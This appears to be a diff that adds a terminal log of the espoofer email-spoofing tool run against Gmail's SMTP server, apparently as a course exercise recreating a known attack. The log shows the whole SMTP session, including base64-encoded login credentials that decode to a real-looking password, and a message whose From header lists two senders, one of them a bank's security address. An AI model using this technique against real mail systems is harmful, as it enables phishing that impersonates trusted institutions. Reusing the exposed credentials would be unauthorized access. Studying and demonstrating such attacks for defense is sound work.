@@ -1,0 +1,79 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -m c -id client_a2
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('smtp.gmail.com', 587)
+>>> 220 smtp.gmail.com ESMTP z14sm3145794ilu.4 - gsmtp
+
+<<< ehlo espoofer-MacBook-Pro.local
+
+>>> 250-smtp.gmail.com at your service, [76.69.115.41]
+250-SIZE 35882577
+250-8BITMIME
+250-STARTTLS
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-CHUNKING
+250 SMTPUTF8
+
+<<< starttls
+
+>>> 220 2.0.0 Ready to start TLS
+
+<<< ehlo espoofer-MacBook-Pro.local
+
+>>> 250-smtp.gmail.com at your service, [76.69.115.41]
+250-SIZE 35882577
+250-8BITMIME
+250-AUTH LOGIN PLAIN XOAUTH2 PLAIN-CLIENTTOKEN OAUTHBEARER XOAUTH
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-CHUNKING
+250 SMTPUTF8
+
+<<< AUTH LOGIN Y2lzNjUxMHZpY3RpbUBnbWFpbC5jb20=
+
+>>> 334 UGFzc3dvcmQ6
+
+<<< UXdlcnR5dWlvcDEyMyE=
+
+>>> 235 2.7.0 Accepted
+
+<<< mail from: <cis6510victim@gmail.com>
+
+>>> 250 2.1.0 OK z14sm3145794ilu.4 - gsmtp
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 250 2.1.5 OK z14sm3145794ilu.4 - gsmtp
+
+<<< data
+
+>>> 354  Go ahead z14sm3145794ilu.4 - gsmtp
+
+<<< From: <cis6510victim@gmail.com>, <security@cibc.com>
+To: <cis6510victim@yahoo.com>
+Subject: client A2: Multiple address in From header
+Date: Tue, 24 Nov 2020 04:40:15 +0000
+Sender: <s@sender.legitimate.com>
+Content-Type: text/plain; charset="UTF-8"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-5SP7IN@message-ids.attack.com>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 250 2.0.0 OK  1606192826 z14sm3145794ilu.4 - gsmtp
+
+<<< quit
+
+>>> 221 2.0.0 closing connection z14sm3145794ilu.4 - gsmtp
+
+Finished.
